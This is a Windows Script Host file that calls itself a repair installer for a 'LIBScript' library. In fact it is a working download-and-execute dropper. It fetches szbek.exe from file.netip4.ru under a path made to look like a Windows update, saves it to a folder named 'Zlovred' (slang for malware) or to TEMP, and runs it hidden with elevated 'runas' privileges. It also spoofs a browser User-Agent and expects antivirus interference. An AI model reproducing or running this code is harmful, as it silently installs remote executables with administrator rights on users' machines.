<?xml version="1.0" encoding="Windows-1251"?>
<!-- ***************************** -->
<!-- File wsf -->
<!-- szbeck.wsf -->
<!--
This Script Download and Install LIBScript.exe File
without Dependences but with Full Functionals.
It may use to Repair LIBScript Installation.
-->
<!-- ***************************** -->
<job id="ID1">
	<script language="JScript">
	<![CDATA[
	/* *********************************************************
	'
	' This Script Lib Downloads Exe File (with Archieve?) to
	' Temporary Directory and Runs it with Elevated Privileges
	'
	* *********************************************************/
	/* *********************************************************
	'
	' ExeDownlRun01( strURL , iTimeOut )
	'
	' This Script Downloads Exe file from strURL Path and
	' Execute it with Script TimeOut in iTimeOut ms
	'
	' PARAMETERS:	strURL - URL Path to Download
	'               iTimeOut - Wait to End Execution of the File
	'               strFileNameExe - Name of Exe File
	'               constOpt - Options of Exe File
	' RETURNS:      0 if Success Download and Run
	'               1 if Error Occur
	'
	* *********************************************************/
	function ExeDownlRun01(strURL, iTimeOut, strFileNameExe, constOpt) {
		var iFlag;
		var tempFolder;
		// Get Temp Folder Name
		tempFolder = getTempEnviron();
		iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
		if(iFlag != 0) return 1;
		RunDownloadedExe02(tempFolder, strFileNameExe, constOpt, iTimeOut);
		return 0;
	}

/* *****************************************************************************
'
' getTempEnviron()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Zlovred Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
function getTempEnviron() {
	var fso, wsh, envProc, envSys;
	var strZlFolder; // Zlovred Temprorary Folder
	// Define ActiveX Objects
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Define System Environment Variable
	envSys = wsh.Environment;
	// Define Zlovred Temprorary Folder
	strZlFolder = "C:\\pub1\\Distrib\\Zlovred";
	// Define and Check Environment Variables
	var envVariable;
	envVariable = strZlFolder;
	if(!fso.FolderExists(envVariable)) {
		envVariable = envProc("TEMP");
		if(!fso.FolderExists(envVariable)) {
			envVariable = envSys("TMP");
			if(!fso.FolderExists(envVariable)) {
				envVariable = "";
			}
		}
	}
	return envVariable;
}

	/* *********************************************************
	 * Function getXmlHttp02
	 * This Function Registers XMLHTTP Object both at
	 * Windows Script Shell and at Web Browswers
	 * If Object can't Register it Returns Empty String
	 *
	 * PARAMETERS:  NONE
	 * RETURNS:     XMLHTTP Object if Success
	 *              Empty String if no COM Object Registred
	* *********************************************************/
	function getXmlHttp02() {
		// body...
		try {
			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
			return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
		} catch (e) {
			try {
				// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
				return new ActiveXObject("MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
			} catch (ee) {
				try {
					// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
					return new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
					// return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
				} catch (eee) {
					try {
						return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
					} catch (eeee) {}
				}
			}
		}
		if(typeof XMLHttpRequest != "undefined") {
			// statement
			return new XMLHttpRequest(); // for Web Browsers
		} else {
			// statement
			return "";
		}
	}
	/* *********************************************************
	 * Function getXmlHttp01
	 * This Function Registers XMLHTTP Object both at
	 * Windows Script Shell and at Web Browswers
	 * If Object can't Register it Returns Empty String
	 *
	 * PARAMETERS:  NONE
	 * RETURNS:     XMLHTTP Object if Success
	 *              Empty String if no COM Object Registred
	* *********************************************************/
	function getXmlHttp01() {
		// body...
		try {
			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
			return new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
			// return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
		} catch (e) {
			try {
				// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
				return new ActiveXObject("MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
			} catch (ee) {
				try {
					// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
					// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
					return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
				} catch (eee) {
					try {
						return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
					} catch (eeee) {}
				}
			}
		}
		if(typeof XMLHttpRequest != "undefined") {
			// statement
			return new XMLHttpRequest(); // for Web Browsers
		} else {
			// statement
			return "";
		}
	}
	/* *********************************************************
	'
	' UploadFilesFromInt( strFile, strURL, strPath )
	' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
	' and Save it on Local Computer to Path strPath
	' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
	'
	' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
	'               strURL -- an URL of the web-site, from which the File
	'               is Downloaded
	'               strPath -- a Place in a Windows Computer (Full path without slash)
	'               in which the File is Downloaded
	'
	' RETURNS:      0 -- If File is Normally Downloaded and Created
	'               1 -- if File in Path strPath Can't Create
	'               2 -- if XMLHTTP or ADOStream Can't Initialize
	'				3 -- if Emty HTTP Responce or Send Access Denied
	'				4 -- if HTTP Response Not 200 (while is not make)
	'
	* *********************************************************/
	function UploadFilesFromInt(strFile, strURL, strPath) {
		var fso, xmlHttp, adoStream;
		// Define FileSystemObject
		try {
			fso = new ActiveXObject("Scripting.FileSystemObject");
		} catch (e) {
			return 1;
		}
		// Define XMLHTTP Help Object
		xmlHttp = getXmlHttp02();
		if(xmlHttp === "") {
			return 2;
		}
		// Define Adodb.Stream Object
		try {
			adoStream = new ActiveXObject("Adodb.Stream");
		} catch (e) {
			return 2;
		}
		var strFileURL;
		var strLocal_Path;
		var intUploadFilesFromInt;
		var blnExistRemoteFile;
		var cb = [];
		// Define Full Downloaded File URL
		strFileURL = strURL + strFile;
		// Define Full Local Path to be Downloaded
		strLocal_Path = strPath + "\\" + strFile;
		// Check if Path is Exist
		if(fso.FolderExists(strPath)) intUploadFilesFromInt = 0;
		else intUploadFilesFromInt = 1;
		// Downloaded File
		// Open URL (Get Requiest synchronous)
		try {
			xmlHttp.Open("GET", strFileURL, false);
		} catch (e) {
			WScript.Echo("Can't Open URL: " + strFileURL + "\nError: " + e);
			return 3;
		}
		// Set User-Agent Header (for Safari Browser)
		xmlHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
		// Define Function onreadystatechange
		xmlHttp.onreadystatechange = function() {
			if(xmlHttp.readyState === 4) {
				cb[0] = xmlHttp.status; // Status of Request (Integer Number)
				cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
				cb[2] = xmlHttp.responseText; // Response Text
				cb[3] = xmlHttp.responseBody; // Response Body
			}
		};
		// Send File from URL
		try {
			xmlHttp.Send();
		} catch (e) {
			WScript.Echo("Can't make Send() Request!\nMay be Block with Antivirus?");
			return 3;
		}
		if(cb[0] == 200 && intUploadFilesFromInt == 0)
			// If Send Request is Successful
			blnExistRemoteFile = true;
		else {
			blnExistRemoteFile = false;
			intUploadFilesFromInt = 4;
			WScript.Echo("Wrong HTTP Status:" + cb[0] + "\mURL = " + strFileURL);
			xmlHttp.Abort();
		}
		if(blnExistRemoteFile) {
			// Set AdoStream Type mode and Open It
			adoStream.Type = 1;
			adoStream.Mode = 3;
			adoStream.Open();
			// Write to AdoStream Response Body of HTTP Request
			adoStream.Write(cb[3]);
			// Save Stream to File
			try {
				adoStream.SaveToFile(strLocal_Path, 2);
			} catch (e) {
				WScript.Echo("Can't Save File Stream into File: " + strLocal_Path + "\nCheck Access Rights!");
				intUploadFilesFromInt = 1;
			}
			// /Downloaded File
			// Close Objects
			adoStream.Close();
			xmlHttp.Abort();
			// Check If File Downloaded
			if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0) intUploadFilesFromInt = 1;
			// /Check if File Downloaded
		}
		return intUploadFilesFromInt;
	}
	/* *********************************************************
	'
	' RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut )
	' This Function Run a strVBS Exe File
	' with Command "strPath & "\" & strVBS " and Arguments constOpt
	'
	' PARAMETERS:   strPath -- The Path to strVBS
	'               strVBS -- a VBS File with instructions
	'               (Windows Scripts Shell)
	'				intTimeOut -- Estimated Time for Running (ms)
	'
	' RETURNS:      NONE
	'
	* *********************************************************/
	function RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut) {
		var strValue, shApp;
		// Define ActiveX Object
		shApp = new ActiveXObject("Shell.Application");
		// Set Exe Command Arguments
		strValue = "\"" + strPath + "\\" + strVBS + "\"";
		// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
		shApp.ShellExecute(strValue, constOpt, strPath, "runas", 0);
		//    setTimeout( DoNothing, intTimeOut );
		// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
		WScript.Sleep(intTimeOut);
	}
	]]>
	</script>
	<script language="JScript">
	<![CDATA[
	// Define Global Variables
	var strHackLIBFileNameExe; // Short Execution File Name
	var constHackLIBOpt; // Arguments of Exe File
	var strHackLIBFolder;
	var httppref001, httphost001, httpport001, dirbase001;
	// Test
	strHackLIBFileNameExe = "szbek.exe";
	constHackLIBOpt = "-pszbeck";
	// Define strHackFolder
	strHackLIBFolder = "C:\\pub1\\Distrib\\LIB\\LIB-JS";
	// Define URL Variables
	//
	httppref001 = "http";
	httphost001 = "file.netip4.ru";
	httpport001 = "80";
	dirbase001 = "/WinUpdate/InitialCommon/";
	// Define Temporary Variables
	var strHackLIBURL, iTimeOut01;
	strHackLIBURL = httppref001 + "://" + httphost001 + ":" + httpport001 + dirbase001;
	iTimeOut01 = 30000; // Time Out bis 30 sec
	]]>
	</script>
	<script language="JScript">
	<![CDATA[
	/* *********************************************************
	 '
	 ' HackerScriptRepair01()
	 '
	 ' This Script Repair HackerScript Library Folders
	 '
	 ' PARAMETERS:	NONE;
	 ' GLOBALS:		strHackLIBURL - URL Path to Download
	 '				iTimeOut01 - Wait to End Execution of the File
	 '      		strHackLIBFileNameExe - Name of Exe File
	 '				constHackLIBOpt - Options of Exe File
	 '				strHackLIBFolder -
	 ' RETURNS:		0 if Success Download and Run
	 '				1 if Folder Already Exists
	 '				2 if Error Occur
	 '
	* *********************************************************/
	function HackerScriptRepair01() {
		var iFlag, fso;
		// Define ActiveX Objects
		fso = new ActiveXObject("Scripting.FileSystemObject");
		// WScript.Echo( strHackLIBFolder );
		if(fso.FolderExists(strHackLIBFolder)) {
			return 1;
		} else {
			iFlag = ExeDownlRun01(strHackLIBURL, iTimeOut01, strHackLIBFileNameExe, constHackLIBOpt);
			if(iFlag == 1) return 2;
			else return 0;
		}
	}
	/* *********************************************************
	'
	' HackerScriptRepair02()
	'
	' This Script Reinstall HackerScript Library Folders
	'
	' PARAMETERS:	NONE;
	' GLOBALS:		strHackLIBURL - URL Path to Download
	'				iTimeOut01 - Wait to End Execution of the File
	' 				strHackLIBFileNameExe - Name of Exe File
	'				constHackLIBOpt - Options of Exe File
	'				strHackLIBFolder -
	' RETURNS:		0 if Success Download and Run
	'				2 if Error Occur
	'
	* *********************************************************/
	function HackerScriptRepair02() {
		var iFlag, fso;
		// Define ActiveX Objects
		fso = new ActiveXObject("Scripting.FileSystemObject");
		// TEST WScript.Echo( strHackLIBFolder );
		iFlag = ExeDownlRun01(strHackLIBURL, iTimeOut01, strHackLIBFileNameExe, constHackLIBOpt);
		if(iFlag == 1) return 2;
		else return 0;
	}
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[
	Dim iFlag
	iFlag = HackerScriptRepair02()
	If iFlag = 0 Then
		WScript.Echo "Success Script Run!"
	ElseIf iFlag = 1 Then
		WScript.Echo "Folder Already Exists."
	ElseIf iFlag = 2 Then
		WScript.Echo "Error Download and Execute Script!"
	End If
	]]>
	</script>
</job>
